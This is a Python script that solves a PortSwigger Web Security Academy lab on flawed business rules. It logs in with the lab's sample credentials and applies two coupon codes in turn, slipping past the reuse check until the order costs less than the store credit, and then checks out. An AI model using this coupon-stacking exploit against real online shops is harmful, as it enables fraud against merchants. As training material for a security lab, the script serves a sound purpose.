# Script for Portswigger lab "Flawed enforcement of business rules"

import requests
from lxml import html
from rich.console import Console
import re

console = Console()
session = requests.Session()

SERVER="https://0a0900860392b51c809b9ebe000600ca.web-security-academy.net/"
LOGIN="login"
CART="cart"
COUPON="cart/coupon"
CHECKOUT="cart/checkout"

def get_csrf_token(page_url):
    """Fetch CSRF token from a given page."""
    response = session.get(page_url)
    tree = html.fromstring(response.content)
    csrf_token = tree.xpath("//input[@name='csrf']/@value")
    return csrf_token[0] if csrf_token else None


def login():
    """Log in to the application."""
    csrf = get_csrf_token(f"{SERVER}{LOGIN}")
    
    payload = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter",
    }

    response = session.post(f"{SERVER}{LOGIN}", data=payload)
    if response.status_code == 200:
        console.print("[green]Login successful[/green]")
        return True
    else:
        console.print("[red]Login failed[/red]")
        console.print(response.text)
        return False


def add_product_to_cart():
    body = f"productId=1&redir=PRODUCT&quantity=1"
    response = session.post(f"{SERVER}{CART}", data=body)

    if response.status_code == 200:
        console.print("[green]Product successfully added to cart![/green]")
        return True
    else:
        console.print("[red]Can't add the product to cart[/red]")
        console.print(response.text)
        return False

def add_coupon(coupon):
    csrf = get_csrf_token(f"{SERVER}{CART}")

    body = f"csrf={csrf}&coupon={coupon}"
    response = session.post(f"{SERVER}{COUPON}", data=body)

    if response.status_code == 200:
        console.print(f"[green]Coupon {coupon} added successfully![/green]")
        return True
    else:
        console.print("[red]Can't add the coupon[/red]")
        console.print(response.text)
        return False

def get_store_credit():
    response = session.get(f"{SERVER}{CART}")
    tree = html.fromstring(response.content)
    store_credit = tree.xpath("//strong/text()")
    match = re.search(r"Store credit: \$(.+)", store_credit[0])

    if match:
        return match.group(1)

def get_curr_payment():
    response = session.get(f"{SERVER}{CART}")
    tree = html.fromstring(response.content)
    payment = tree.xpath("//th/text()")

    for i in payment:    
        match = re.search(r"\$(.+)", i)

        if match:
            return match.group(1)

def checkout():
    csrf = get_csrf_token(f"{SERVER}{CART}")

    body = f"csrf={csrf}"
    response = session.post(f"{SERVER}{CHECKOUT}", data=body)

    if response.status_code == 200:
        console.print(f"[green]Lab solved![/green]")
        return True
    else:
        console.print("[red]Cannot pay...[/red]")
        console.print(response.text)
        return False
     

with console.status("Solving..."):
    login()
    add_product_to_cart()
    credit = get_store_credit()
    can_pay = False
    index = 0

    console.print("Store credit: ", credit)

    while not can_pay:
        curr_payment = get_curr_payment()
        console.print("Current payment: ", curr_payment)

        coupon = "NEWCUST5" if index % 2 == 0 else "SIGNUP30"
        index += 1

        add_coupon(coupon)

        if curr_payment < credit:
            can_pay = True

    checkout()
